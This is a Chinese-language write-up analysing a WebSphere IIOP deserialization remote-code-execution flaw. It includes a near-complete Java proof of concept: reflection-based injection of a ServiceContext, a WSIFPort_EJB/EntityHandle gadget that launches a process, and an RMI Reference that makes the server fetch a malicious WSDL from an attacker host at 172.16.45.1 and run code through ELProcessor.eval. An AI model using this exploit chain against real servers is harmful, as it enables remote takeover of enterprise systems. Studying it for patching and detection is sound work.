## WebSphere简介

WebSphere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web
应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。WebSphere 提供了可靠、灵活和健壮的软件。

WebSphere Application Server 是该设施的基础，其他所有产品都在它之上运行。WebSphere Process Server 基于
WebSphere Application Server 和 WebSphere Enterprise Service Bus，它为面向服务的体系结构
(SOA) 的模块化应用程序提供了基础，并支持应用业务规则，以驱动支持业务流程的应用程序。高性能环境还使用 WebSphere Extended
Deployment 作为其基础设施的一部分。其他 WebSphere 产品提供了广泛的其他服务。

WebSphere 是一个模块化的平台，基于业界支持的开放标准。可以通过受信任和持久的接口，将现有资产插入
WebSphere，可以继续扩展环境。WebSphere 可以在许多平台上运行，包括 Intel、Linux 和 z/OS。

WebSphere
是随需应变的电子商务时代的最主要的软件平台，可用于企业开发、部署和整合新一代的电子商务应用，如B2B，并支持从简单的网页内容发布到企业级事务处理的商业应用。WebSphere
可以创建电子商务站点， 把应用扩展到联合的移动设备， 整合已有的应用并提供自动业务流程。

## WSDL简介

WSDL是一个用于精确描述Web服务的文档，WSDL文档是一个遵循WSDL-XML模式的XML文档。WSDL 文档将Web服务定义为服务访问点。在 WSDL
中，由于服务访问点和消息的抽象定义已从具体的服务部署或数据格式绑定中分离出来，因此可以对抽象定义进行再次使用。消息，指对交换数据的抽象描述；而端口类型，指操作的抽象集中。用于特定端口类型的具体协议和数据格式规范构成了可以再次使用的绑定。将Web访问地址与可再次使用的绑定相关联，可以定义一个端口，而端口的集中则定义为服务。
一个WSDL文档通常包含8个重要的元素，即definitions、types、import、message、portType、operation、binding、service元素。这些元素嵌套在definitions元素中，definitions是WSDL文档的根元素。

## 漏洞原理深度分析

网上最早披露的漏洞相关详情信息是在<https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere>此篇博文中进行讲解的。

根据文中的部分描述，此漏洞是由IIOP协议上的反序列化造成，所以我们本地需要起一个IIOP客户端来向WebSphere发送请求从而触发漏洞。

代码如下所示

    
    
    Hashtable env = new Hashtable();  
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");  
    env.put(Context.PROVIDER_URL, "iiop://172.16.45.148:2809");  
    InitialContext initialContext = new InitialContext(env);  
    initialContext.list("");

根据文章中的描述我们来到TxServerInterceptor这个拦截器的receive_request方法中，根据博主的描述在到达反序列化点之前的执行路径如下所示

![](https://image.3001.net/images/20200817/1597634810.png!small)

我们先从TxServerInterceptor的receive_request方法开始调试。

我们运行IIOP客户端，向WebSphere发送请求，但是很快就发现执行链中的第二个断点并没有被执行，我们来看下源码

![](https://image.3001.net/images/20200817/1597634840.png!small)

首先先看validOtsContext是在哪里进行的赋值

![](https://image.3001.net/images/20200817/1597634862.png!small)

可以看到validOtsContext的值为ture 或者false 取决于serviceContext的值是否为空。

经过调试发现不出所料serviceContext的值为空，那么现在就面临第一个问题就是要让程序执行到指定位置，所以我们要想办法为serviceContext赋一个值。

![](https://image.3001.net/images/20200817/1597634886.png!small)

所以我们跟入`serviceContext =
((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)`这行代码，深度挖掘这个`((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)`这个方法的返回值我们可不可控，判断一下这个serviceContext的值是否获取自IIOP客户端发送的数据。

下面列出分析serviceContext值来源的调用链

![](https://image.3001.net/images/20200817/1597634906.png!small)

最终来到ServiceContextList的getServiceContext方法，一下是该方法的具体实现

    
    
    public ServiceContext getServiceContext(int var1) {  
    ServiceContext var2 = null;  
    synchronized(this) {  
    for(int var4 = 0; var4 < this.serviceContexts.length; ++var4) {  
    if (this.serviceContexts[var4].getId() == var1) {  
    var2 = this.serviceContexts[var4];  
    break;  
    }  
    }  
    ​  
    return var2;  
    }  
    }

这里的var1是`((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)`的参数也就是0，这里会循环遍历ServiceContexts,
如果其中有一个ServiceContext的id值为0，则会为var2赋值并返回。也就是说我们要想办法让ServiceContext的id值为0。那么此时我们就要看这里的serviceContexts究竟又是在哪里尽心的赋值。

经过对代码的回溯，最终找到了这个为serviceContexts赋值的点，在RequestMessage的read方法中，这里会生成ServiceContext对象并为其id值进行复制，而这里的id值就是又客户端传递来的序列化数据中读取到的，那么就意味着该值可控。

![](https://image.3001.net/images/20200817/1597635639.png!small)

那么我们就要回到POC的构造中来思考怎么设置ServiceContext的值。

根据奇安信 观星实验室的iswin大佬给的思路，在将构造好的ServerContext封装进请求数据之前需要先进行一次查询操作，从而让数据初始化

这是初始化之前其中的_context对象是null

![](https://image.3001.net/images/20200817/1597635661.png!small)当执行完一次查询操作后_context对象就成功被初始化了

![](https://image.3001.net/images/20200817/1597635727.png!small)

后续的一些操作就主要围着_context对象中的属性来进行操作了，经过一番查找最终锁定了一个可以操作的ServerContext对象的属性，

贴一下该属性所在的位置，这里我精简掉了其余的暂时用不到的属性。

![](https://image.3001.net/images/20200817/1597635753.png!small)这里并没有显示该属性的类型，所以去Connection类中查找对应的属性，确定其类型

![](https://image.3001.net/images/20200817/1597635845.png!small)

现在我们的目标明确了，就是要向该属性赋一个ServiceConetxt的值，这里就需要用到一系列的反射了,截止到orb属性为止都可以通过简单的反射来进行获取代码如下所示

    
    
    Field f_defaultInitCtx = initialContext.getClass().getDeclaredField("defaultInitCtx");  
    f_defaultInitCtx.setAccessible(true);  
    WsnInitCtx defaultInitCtx = (WsnInitCtx) f_defaultInitCtx.get(initialContext);  
    ​  
    Field f_context = defaultInitCtx.getClass().getDeclaredField("_context");  
    f_context.setAccessible(true);  
    CNContextImpl _context = (CNContextImpl) f_context.get(defaultInitCtx);  
    ​  
    Field f_corbaNC = _context.getClass().getDeclaredField("_corbaNC");  
    f_corbaNC.setAccessible(true);  
    _NamingContextStub _corbaNC = (_NamingContextStub) f_corbaNC.get(_context);  
    ​  
    Field f__delegate = ObjectImpl.class.getDeclaredField("__delegate");  
    f__delegate.setAccessible(true);  
    ClientDelegate clientDelegate = (ClientDelegate)f__delegate.get(_corbaNC);  
    ​  
    Field f_ior = clientDelegate.getClass().getSuperclass().getDeclaredField("ior");  
    f_ior.setAccessible(true);  
    IOR ior = (IOR) f_ior.get(clientDelegate);  
    ​  
    Field f_orb = clientDelegate.getClass().getSuperclass().getDeclaredField("orb");  
    f_orb.setAccessible(true);  
    ORB orb = (ORB)f_orb.get(clientDelegate);

然后根据iswin大佬文章中给的相关代码
可以通过反射获取orb属性中存储的GIOPImpl对象的getConnection方法，然后通过getConnection方法在获取我们所需要的Connection对象

代码如下

    
    
    //通过反射获取的orb属性 调用其getServerGIOP方法获取封装在其中的GIOPImpl对象  
    GIOPImpl giopimpl = (GIOPImpl) orb.getServerGIOP();  
    //反射获取该GIOPImpl对象的getConnection方法  
    Method getConnection = giopimpl.getClass().getDeclaredMethod("getConnection", com.ibm.CORBA.iiop.IOR.class, Profile.class, com.ibm.rmi.corba.ClientDelegate.class, String.class);  
    getConnection.setAccessible(true);  
    //调用getConnection方法传入对应参数,获取所需的Connection对象。  
    Connection connection = (Connection) getConnection.invoke(giopimpl,ior,ior.getProfile(),clientDelegate,"LinShiGong");

根据之前对ServerContext对象的分析，我们需要将它封装进该Connection对象的connectionContext属性中，所以还需要通过反射获取Connection对象的setConnectionContexts方法，并通过该方法将我们实例化好的ServerContext对象存入其中

代码如下

    
    
    //反射获取Connection对象的setConnectionContexts方法  
    Method setConnectionContexts = connection.getClass().getDeclaredMethod("setConnectionContexts", ArrayList.class);  
    setConnectionContexts.setAccessible(true);

接下来我们需要实例化一个ServiceContext对象并将其id值设置为0

代码如下

    
    
    //为了满足ServiceContext构造方法需要的参数，先随意构造一个byte[]  
    byte[] result = new byte[]{00,00};  
    ServiceContext serviceContext = new ServiceContext(0,result);

接下来通过反射获得的setConnectionContexts方法将ServiceContext对象存入Connection对象中

代码如下

    
    
    //由于setConnectionContexts的参数是一个ArrayList类型所以需要将ServiceContext对象先放入一个ArrayList中  
    ArrayList var4 = new ArrayList();  
    var4.add(serviceContext);  
    setConnectionContexts.invoke(connection,var4);  
    //再次进行查询操作  
    initialContext.list("");

回到WebSphere这边，继续调试看能否执行到TxInterceptorHelper.demarshalContext方法的位置，可以看到此时serviceContext的值不在为空了，validOtsContext的值也变成的true

![](https://image.3001.net/images/20200817/1597644507.png!small)可以看到程序现在可以执行到指定位置了，那我们就继续往下走。

![](https://image.3001.net/images/20200817/1597644529.png!small)进入到demarshalContext方法后又遇到了第二个问题，就是该方法内会对客户端传来的数据进行读取，并封装入一个PropagationContext对像中

![](https://image.3001.net/images/20200817/1597644555.png!small)这里传入了三个参数然后生成了一个inputStream对象，面对这种问题首先要看这个inputStream读取的数据究竟是哪个参数里面的，所以深入跟进inputStream.read_ulong方法，并最终来到CDRInputStream.read_long方法中，观察代码可知，读取的区域是当前对象的buf属性中的内容，

![](https://image.3001.net/images/20200817/1597644587.png!small)看了这个buf属性后觉得很眼熟，回头看我们在客户端这边实例化ServiceContext对像时传入的result参数和该属性的值一模一样，由此可知我们需要在客户端实例化ServiceContext时在精心构造一下其所需的第二个参数。

![](https://image.3001.net/images/20200817/1597644619.png!small)我们要找到与demarshalContext方法对应的marshalContext方法，然后看看该方法是怎么处理数据的，然后我们照着来就行了。

![](https://image.3001.net/images/20200817/1597644646.png!small)

根据上面的格式我们自己稍微修改一下

代码如下

    
    
    CDROutputStream outputStream = ORB.createCDROutputStream();  
    outputStream.putEndian();  
    Any any = orb.create_any();  
    //生成一个PropagationContext对象。  
    PropagationContext propagationContext = new PropagationContext(  
    0,  
    new TransIdentity(null,null,new otid_t(0,0,new byte[0])),  
    new TransIdentity[0],  
    any  
    );  
    PropagationContextHelper.write(outputStream,propagationContext);  
    //输出为byte数组  
    byte[] result = outputStream.toByteArray();  
    ​  
    ServiceContext serviceContext = new ServiceContext(0,result);  
    ArrayList var4 = new ArrayList();  
    var4.add(serviceContext);  
    setConnectionContexts.invoke(connection,var4);  
    ​  
    initialContext.list("");

这样就可以成功执行到`propContext.implementation_specific_data =
inputStream.read_any()`这行代码。继续跟入

跟到TCUtility类的unmarshalIn方法中，这里遇到了第三个问题，根据https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere此篇博文中的介绍，该方法中有一个switch我们需要走到如下图所示的代码位置

![](https://image.3001.net/images/20200817/1597644843.png!small)

但是目前的参数经过选择是走不到此处的，所以就又需要我们来查看此处的参数是否是前端传入并且是否可控了，如果可控那就需要我们继续在前端对数据进行构造。

我们先观察这里传递进来的第一个参数也就是var0 一个InputStream类型的参数

![](https://image.3001.net/images/20200817/1597644870.png!small)代码调回到PropagationContext类的demarshalContext方法，看到出发漏洞的代码如下图所示，其实结合客户端的代码不难知道这是在反序列化我们传递的PropagationContext对象里封装的一个AnyImpl对象那个

![](https://image.3001.net/images/20200817/1597644893.png!small)

其实结合客户端的代码不难知道这是在反序列化我们传递的PropagationContext对象里封装的一个AnyImpl对象那个

    
    
    //就是这个AnyImpl  
    Any any = orb.create_any();  
    PropagationContext propagationContext = new PropagationContext(  
    0,  
    new TransIdentity(null,null,new otid_t(0,0,new byte[0])),  
    new TransIdentity[0],  
    any  
    );

根据博文中的描述IBM Java
SDK中Classloader中禁掉了一些gadget用到的类，TemplatesImpl类不再是可序列化的，而此类又常用于很多公共gadget链中，根据IBM
Java SDK中TemplatesImpl类和oracle JDK中TemplatesImpl类的继承关系可以确认这一点。

Oracle JDK中的TemplatesImpl类的继承关系

![](https://image.3001.net/images/20200817/1597644937.png!small)IBM Java
SDK中的TemplatesImpl类的继承关系，可以看到没有实现Serializable接口

![](https://image.3001.net/images/20200817/1597644962.png!small)

IBM SDK不使用Oracle
JDK的Java命名和目录接口(JNDI)实现。因此，它不会受到通过RMI/LDAP加载远程类的攻击，以上的种种限制都增加了RCE的难度，我们需要重新在IBM
WebSphere中找到一条新的利用链。

大佬们给出了相应的思路，IBM
WebSphere中有这么一个类WSIFPort_EJB可以作为入口，此次反序列化RCE利用了WSIFPort_EJB在反序列化时会从前端传入的数据中反序列化初一个Handle对象，并且会调用该对象的getEJBObject()方法。

![](https://image.3001.net/images/20200817/1597644991.png!small)我们需要将WSIFPort_EJB封装入PropagationContext类的implementation_specific_data属性中，也就是AnyImpl对像中，这样在执行`propContext.implementation_specific_data
=
inputStream.read_any()`将AnyImpl对象从inputStream中反序列化出来的时候，就会自然而然的去反序列化我们封装进去的WSIFPort_EJB方法从而执行其readObject方法

![](https://image.3001.net/images/20200817/1597645019.png!small)

代码如下

    
    
    WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null,null,null);  
    Any any = orb.create_any();  
    any.insert_Value(wsifPort_ejb);

修改完后再次运行，发现可以执行到此次反序列化漏洞的入口点，WSIFPort_EJB类的readObject方法了

![](https://image.3001.net/images/20200817/1597645054.png!small)

由于我们选择利用这里的`handle.getEJBObject()`方法，所以需要找到一个实现了Handle接口的类，最终找到了com.ibm.ejs.container.EntityHandle这个类

在谈到EntityHandle这个类之前我们先看下EntityHandle的getEJBObject方法，以下是该方法中的部分代码

    
    
    public EJBObject getEJBObject() throws RemoteException {  
    ......  
    //此处的this.homeJNDIName和homeClass皆为我们可控  
    home = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.homeJNDIName), homeClass);  
    } catch (NoInitialContextException var7) {  
    Properties p = new Properties();  
    p.put("java.naming.factory.initial", "com.ibm.websphere.naming.WsnInitialContextFactory");  
    ctx = new InitialContext(p);  
    home = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.homeJNDIName), homeClass);  
    }  
    ​  
    Method fbpk = this.findFindByPrimaryKey(homeClass);  
    this.object = (EJBObject)fbpk.invoke(home, this.key);  
    } catch (InvocationTargetException var10) {  
    ......  
      
    }

首先我们已知this.homeJNDIName是我们可控的，那么就意味着我们可以指定WebSphere去lookup一个指定rmi或者ldap服务器，我们在服务器上可以放一个RMI
Reference 来让WebSphere进行加载。

生成一个可利用EntityHandle的对象需要通过一系列比较复杂的反射，根据Iswin大佬提供的思路，代码如下

    
    
    WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null,null,null);  
    Field fieldEjbObject = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");  
    fieldEjbObject.setAccessible(true);  
    fieldEjbObject.set(wsifPort_ejb,new EJSWrapper(){  
    @Override  
    public Handle getHandle() throws RemoteException {  
    ​  
    Handle var2 = null;  
    ​  
    try {  
    ​  
    SessionHome sessionHome = new SessionHome();  
    J2EEName j2EEName = new J2EENameImpl("iswin",null,null);  
    Field j2eeName = EJSHome.class.getDeclaredField("j2eeName");  
    j2eeName.setAccessible(true);  
    j2eeName.set(sessionHome,j2EEName);  
    Field jndiName = EJSHome.class.getDeclaredField("jndiName");  
    jndiName.setAccessible(true);  
    //jndiName.set(sessionHome,System.getProperty("rmi_backedn"));  
    jndiName.set(sessionHome,"rmi://172.16.45.1:1097/Object");  
    BeanId beanId = new BeanId(sessionHome,"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")");  
    Properties initProperties = new Properties();  
    ​  
    initProperties.setProperty("java.naming.factory.object","org.apache.wsif.naming.WSIFServiceObjectFactory");  
    Constructor entiyHandleConstructor = EntityHandle.class.getDeclaredConstructor(BeanId.class,BeanMetaData.class,Properties.class);  
    entiyHandleConstructor.setAccessible(true);  
    BeanMetaData beanMetaData = new BeanMetaData(1);  
    beanMetaData.homeInterfaceClass = com.ibm.ws.batch.CounterHome.class;  
    var2 = (Handle)entiyHandleConstructor.newInstance(beanId,beanMetaData,initProperties);  
    ​  
    }catch (Exception e){  
    e.printStackTrace();  
    }  
    ​  
    return var2;  
    }  
    });

之所以这样写是因为WSIFPort_EJB对象在序列化时会调用自身的fieldEjbObject属性的getHandle方法，并将其返回值进行序列化，所以我们通过反射为fieldEjbObject属性赋值一个EJSWrapper对象，并重写其getHandle方法，在getHandle通过反射实例化EntityHandle对象。

![](https://image.3001.net/images/20200817/1597645449.png!small)回到EntityHandle的getEJBObject方法中，跟进ctx.lookup(this.homeJNDIName)
跟到ObjectFactoryHelper的getObjectInstanceViaContextDotObjectFactories方法里的时候可以看到

![](https://image.3001.net/images/20200817/1597645478.png!small)这里看到environment参数是我们可控的，所以在该方法中可以调用我们指定的factory的getObjectInstance方法，可以看到这里的值是在我们在EntityHandle实例化的时候作为参数传递进去了

![](https://image.3001.net/images/20200817/1597645513.png!small)

我们传递进去的值是`org.apache.wsif.naming.WSIFServiceObjectFactory`所以会调用WSIFServiceObjectFactory类的getObjectInstance方法

我们来看一下该方法的部分代码，这里会对look加载的Reference的信息进行解析，并挨个Reference中的值取出。

    
    
    public Object getObjectInstance(Object obj, Name name, Context context, Hashtable env) throws Exception {  
    Trc.entry(this, obj, name, context, env);  
    if (obj instanceof Reference && obj != null) {  
    ......  
    }  
    } else if (ref.getClassName().equals(WSIFServiceStubRef.class.getName())) {  
    wsdlLoc = this.resolveString(ref.get("wsdlLoc"));  
    serviceNS = this.resolveString(ref.get("serviceNS"));  
    serviceName = this.resolveString(ref.get("serviceName"));  
    portTypeNS = this.resolveString(ref.get("portTypeNS"));  
    portTypeName = this.resolveString(ref.get("portTypeName"));  
    String preferredPort = this.resolveString(ref.get("preferredPort"));  
    String className = this.resolveString(ref.get("className"));  
    if (wsdlLoc != null) {  
    WSIFServiceFactory factory = WSIFServiceFactory.newInstance();  
    WSIFService service = factory.getService(wsdlLoc, serviceNS, serviceName, portTypeNS, portTypeName);  
    Class iface = Class.forName(className, true, Thread.currentThread().getContextClassLoader());  
    Object stub = service.getStub(preferredPort, iface);  
    Trc.exit(stub);  
    return stub;  
    }  
    }  
    }  
    ​  
    Trc.exit();  
    return null;  
    }

来看一下Reference中的代码。

    
    
    Registry registry = LocateRegistry.createRegistry(1097);  
    ​  
    Reference reference = new Reference(WSIFServiceStubRef.class.getName(),(String) null,(String) null);  
    ​  
    reference.add(new StringRefAddr("wsdlLoc","http://172.16.45.1:8000/poc.xml"));  
    reference.add(new StringRefAddr("serviceNS","http://www.ibm.com/namespace/wsif/samples/ab"));  
    reference.add(new StringRefAddr("serviceName","rce_service"));  
    reference.add(new StringRefAddr("portTypeNS","http://www.ibm.com/namespace/wsif/samples/ab"));  
    reference.add(new StringRefAddr("portTypeName","RceServicePT"));  
    reference.add(new StringRefAddr("preferredPort","JavaPort"));  
    reference.add(new StringRefAddr("className","com.ibm.ws.batch.CounterHome"));  
    ​  
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);  
    registry.bind("Object",referenceWrapper);

这里先要注意到的一点就是最后有一个`reference.add(new
StringRefAddr("className","com.ibm.ws.batch.CounterHome"))`这里牵扯到最终该getObjectInstance函数返回值的类型问题，之前在看EntityHandle的getEJBObject方法时,narrow方法的返回值其实就是

ctx.lookup(this.homeJNDIName)的返回值，也就是说ctx.lookup(this.homeJNDIName)返回值的类型是要实现自EJBHome接口

    
    
    home = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.homeJNDIName), homeClass);

WSIFServiceObjectFactory的getObjectInstance方法的返回值是一个Proxy类型，而该Proxy类型在创建时传入的接口参数就是Reference中的`new
StringRefAddr("className","com.ibm.ws.batch.CounterHome")`，之所以选择CounterHome作为返回的Proxy对象的接口，CounterHome继承了EJBHome是一个原因，还有一个原因就是该接口中声明了接下来要用到了findFindByPrimaryKey方法

![](https://image.3001.net/images/20200817/1597645572.png!small)

讲完了为何选择CounterHome作为返回Proxy对象的接口，接下来getObjectInstance方法中还有这么一段代码

    
    
    WSIFService service = factory.getService(wsdlLoc, serviceNS, serviceName, portTypeNS, portTypeName);

这里会根据解析的Reference中的wsdlLoc字段的值也就是<http://172.16.45.1:8000/poc.xml>去该地址加载制定的xml文件，这个poc.xml就是一个WSDL文件内容如下，关于此WSDL文件的构造可以参考此篇文章<https://ws.apache.org/wsif/providers/wsdl_extensions/java_extension.html#N10041>

    
    
    <definitions  
    name="RceServicePT"  
    targetNamespace="http://www.ibm.com/namespace/wsif/samples/ab"  
    xmlns:xsd="http://www.w3.org/2000/10/XMLSchema"  
    xmlns:tns="http://www.ibm.com/namespace/wsif/samples/ab"  
    xmlns:format="http://schemas.xmlsoap.org/wsdl/formatbinding/"  
    xmlns:java="http://schemas.xmlsoap.org/wsdl/java/"  
    xmlns="http://schemas.xmlsoap.org/wsdl/"  
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
    xsi:schemaLocation="http://schemas.xmlsoap.org/wsdl/formatbinding/">  
    ​  
    ​  
    <message name="findByPrimaryKeyRequse">  
    <part name="term" type="xsd:string"/>  
    </message>  
    ​  
    <message name="findByPrimaryKeyReponse">  
    <part name="value" type="xsd:object"/>  
    </message>  
    ​  
    <portType name="RceServicePT">  
    <operation name="findByPrimaryKey">  
    <input name="getExpressionRequest" message="tns:findByPrimaryKeyRequse"/>  
    <output name="getExpressionResponse" message="tns:findByPrimaryKeyReponse"/>  
    </operation>  
    </portType>  
    <binding name="JavaBinding" type="tns:RceServicePT">  
    <java:binding/>  
    <format:typeMapping encoding="Java" style="Java">  
    <format:typeMap typeName="xsd:string" formatType="java.lang.String"/>  
    <format:typeMap typeName="xsd:object" formatType="java.lang.Object"/>  
    ​  
    </format:typeMapping>  
    ​  
    <operation name="findByPrimaryKey">  
    <java:operation  
    methodName="eval"  
    parameterOrder="term"  
    methodType="instance"  
    returnPart="value"/>  
    <input name="getExpressionRequest"/>  
    <output name="getExpressionResponse"/>  
    </operation>  
    </binding>  
    ​  
    <service name="rce_service">  
    <port name="JavaPort" binding="tns:JavaBinding">  
    <java:address className="javax.el.ELProcessor"/>  
    </port>  
    </service>  
    </definitions>

可以看到Reference中的serviceName，portTypeName，preferredPort等字段的值都可以在这个xml中找到。

最终加载解析完成后会返回一个WSIFServiceImpl类型的值。getObjectInstance执行完成后会根据该WSIFServiceImpl对象生成一个对应的Proxy对象，也就前面提到的实现接口为CounterHome的那个proxy对象。

WSIFServiceObjectFactory的getObjectInstance方法执行完成后返回至EntityHandle的getEJBObject方法中，接下来会执行这里会查询homeClass中是否有个方法名叫findFindByPrimaryKey的方法，如果有的话返回该方法的Method对象，如果没有则返回空，该homeClass变量里的值是我们可控的，在IIOP客户端生成EntityHandle对象时就已经封装好了，其值为com.ibm.ws.batch.CounterHome所以执行结果时返回findFindByPrimaryKey方法的Method对像。

    
    
    Method fbpk = this.findFindByPrimaryKey(homeClass)

接下来就会执行最关键的一步也就是

    
    
    this.object = (EJBObject)fbpk.invoke(home, this.key)

![](https://image.3001.net/images/20200817/1597645620.png!small)

接下来就会执行到WSIFClientProxy的Invoke方法中然后跟踪到WSIFOperation_Java的executeRequestResponseOperation方法中，该方法中有这么一行代码

    
    
    result = this.fieldMethods[a].invoke(objRef, compatibleArguments);

![](https://image.3001.net/images/20200817/1597645655.png!small)

可以看到这里就通过放反射的方法调用javax.el.ELProcessor的eval方法了，并将我们我们想要执行的代码传递了进去。至此CVE-2020-445反序列化远程代码执行漏洞分析完毕。

## 总结

此次漏洞确实稍显复杂，但是思路其实还是挺清晰的，首先是通过构造发送的数据，让WebSphere先执行到反序列化的点，然后由于IBM JAVA
SDK本身的限制，没办法使用RMI Reference或者LDAP Reference 远程加载Class到本地来执行恶意代码的方式了所以
需要从本地找到一个实现了ObjectFactory的类，并且该类在getObjectInstance方法中进行了有风险的操作，这里可以参考Michael
Stepankin大佬的这篇文章https://www.veracode.com/blog/research/exploiting-jndi-injections-java。所以找到了WSIFServiceObjectFactory，该类解析了Reference并根据Reference中的值去加载和解析我们事先准备好的一个恶意WSDL文件。最终WebSphere根据WSIFServiceObjectFactory的getObjectInstance方法的返回值通过反射的方式调用了javax.el.ELProcessor的eval方法了最终执行了我们的恶意代码。

